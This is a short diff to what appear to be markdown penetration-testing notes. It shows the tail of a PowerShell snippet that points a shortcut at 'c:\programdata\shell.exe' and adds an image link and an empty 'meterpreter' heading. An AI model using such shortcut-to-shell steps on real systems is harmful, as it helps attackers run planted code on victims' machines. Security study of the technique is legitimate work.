@@ -164,6 +164,19 @@ $lnk.TargetPath = "c:\programdata\shell.exe"
 $lnk.Save()
 ```
 
+![[Pasted image 20240629122907.png]]
+
+### meterpreter
+
+
+
+
+
+
+
+
+
+
 
 
 
